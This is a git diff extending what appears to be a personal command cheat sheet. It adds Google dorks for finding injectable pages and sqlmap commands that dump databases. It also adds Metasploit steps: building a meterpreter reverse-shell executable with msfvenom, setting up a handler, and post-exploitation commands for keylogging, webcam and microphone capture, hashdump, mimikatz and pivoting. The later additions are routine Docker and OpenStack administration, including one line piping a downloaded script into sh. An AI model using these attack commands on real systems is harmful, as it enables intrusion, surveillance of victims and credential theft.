@@ -238,9 +238,15 @@ vuln: This category is for scripts related to security vulnerabilities
  nping -c30 scanme.nmap.org
  nmap -sn --max-retries 10 192.168.1.1
  
- 
- 
- 
+#search within google hack database for web hack
+inurl:index.php?id=
+inurl:gallery.php?id=
+inurl:post.php?id=
+inurl:art?id=
+sqlmap.py -u "URL of a vulnerable web page"--dbs
+sqlmap -u "URL of a vulnerable web page"--tables -D scanme
+sqlmap -u "URL of a vulnerable web page"-column -D scanme -T table_name
+
  
 msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.44.134;
                set LPORT 8080; run; exit -y"
@@ -265,3 +271,153 @@ background
 run event_manager -i
 run event_manager -c
 clearev
+
+sysinfo
+enumdesktop
+getdesktop
+screenshots
+record_mic
+webcam_stream
+webcam_list
+keyscan_start/keyscan_dump
+search *.pdf
+getuid
+getpid
+hashdump
+'load mimikatz' then run 'kerberos'
+sniffer_interface/sniffer_start/sniffer_dump
+getsystem
+
+Example:
+db_nmap -sV 192.168.1.1 -p 21,22,23,25,80,135,139,443,445 --open
+http://192.168.1.1
+use auxiliary/scanner/http/brute_dirs
+use auxiliary/scanner/http/dir_scanner
+use expliot/multi/scanner/http/php-utility-belt
+
+msfvenom windows/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=4444 -f exe > test.exe
+use exploit/multi/handler
+set payload linux/x86/meterpreter/reverse_tcp
+set LHOST 192.168.1.2
+set LPORT 4444
+exploit
+
+(run ipconfig then see another IP 172.28.128.8 not 192.168.1.1's subnet)
+use post/windows/manage/autoroute
+set SUBNET 172.28.128.0
+-----
+set SQL "show tables from wordpress"
+set SQL "select * from wordpress.wp_users"
+use auxiliary/server/socks4a
+
+
+#Docker 
+sudo apt-get install -y docker-engine
+docker --version
+sudo wget -qO- https://get.docker.io/ | sh
+
+sudo docker pull hello-world
+sudo docker images
+docker run hello-world
+sudo service docker status
+sudo service docker restart
+docker history
+sudo docker push busybox
+sudo docker pull busybox:1.24
+sudo docker images --no-trunc
+sudo docker pull registry.example.com/myapp
+sudo docker search mysql
+sudo docker run -i -t ubuntu:16.04 /bin/bash
+sudo docker attach hello-world
+sudo docker diff d5ad60f174d3(ID)
+sudo docker start/stop/pause/unpause d5ad60f174d3(ID)
+sudo docker commit d5ad60f174d3(ID)
+sudo docker logs
+
+sudo git clone https://github.com/openstack-dev/devstack.git /opt/devstack/
+cd /opt/devstack/
+sudo tools/create-stack-user.sh
+sudo chown -R stack:stack /opt/devstack/
+sudo -i -u stack
+cd /opt/devstack/
+
+openstack service create --name glance --description "OpenStack Image service" image
+openstack service list
+openstack endpoint create \
+          --publicurl http://10.0.2.15:9292 \
+          --internalurl http://10.0.2.15:9292 \
+          --adminurl http://10.0.2.15:9292
+          --region RegionOne image
+openstack endpoint list
+
+source keystonerc_admin
+openstack project create --description "Test project" apress
+openstack project list
+
+openstack user create --password-prompt apressuser
+openstack role add --project apress --user apressuser _member_
+openstack role list
+
+openstack user delete apressuser
+openstack project delete apress
+systemctl status memcached.service
+openstack endpoint show identity
+
+wget -P /tmp http://download.cirros-cloud.net/0.3.4/cirros-0.3.4-x86_64-disk.img
+qemu-img info /tmp/cirros-0.3.4-x86_64-disk.img
+openstack image create --file /tmp/cirros-0.3.4-x86_64-disk.img --disk-format qcow2 \
+					   --container-format bare --public cirros-0.3.4-x86_64
+openstack image add project
+
+source keystonerc_demo
+neutron net-create ext-net --router:external True --provider:physical_network external --provider:network_type flat
+neutron subnet-create ext-net --name ext-subnet --allocation-pool
+        start=10.0.2.100,end=10.0.2.200 --disable-dhcp --gateway 10.0.2.2 10.0.2.0/24
+neutron net-list
+
+neutron net-create demo-net
+neutron subnet-create demo-net --name demo-subnet --gateway 172.16.0.1 172.16.0.0/24
+neutron router-create demo-router
+neutron router-interface-add demo-router demo-subnet
+#set ext-net as a gateway for the router
+neutron router-gateway-set demo-router ext-net
+
+source keystonerc_admin
+neutron port-list
+#reach out to an external network
+neutron floatingip-create ext-net
+nova list
+nova port-list
+neutron floatingip-associate node-identity
+
+nova secgroup-create apress-sgroup "Apress secgroup"
+nova secgroup-add-rule apress-sgroup tcp 22 22 0.0.0.0/0
+nova add-secgroup apressinstance11 apress-sgroup
+nova remove-secgroup apressinstance1 default
+nova secgroup-list-rules apress-sgroup
+neutron quota-show
+
+#Nova: manage basic virtual machines functions like creating, starting, stopping
+
+openstack flavor list
+
+source keystonerc_admin
+#create flavor name m10.tiny that has a 3GB disk, 400Mb RAM, and 1 vCPU
+nova flavor-create --is-public true m10.tiny auto 400 3 1
+nova flavor-delete m10.tiny
+
+nova keypair-add apresskey1 > ~/apresskey1
+nova keypair-list
+chmod 600 apresskey1
+ssh -i ~/apresskey1 cirros@192.168.0.1
+nova boot --flavor m10.tiny --image cirros-raw --security-groups apress-sgroup --key-name apresskey1 apressinstance1
+nova get-vnc-console apressinstance1 novnc
+nova stop/delete/reboot apressinstance1
+nova image-create apressinstance1 apressinstance1_snap
+nova quota-show
+nova hypervisor-list
+nova-manage vm list | grep active
+systemctl status *nova* -n 0
+openstack service show nova
+openstack endpoint show nova
+
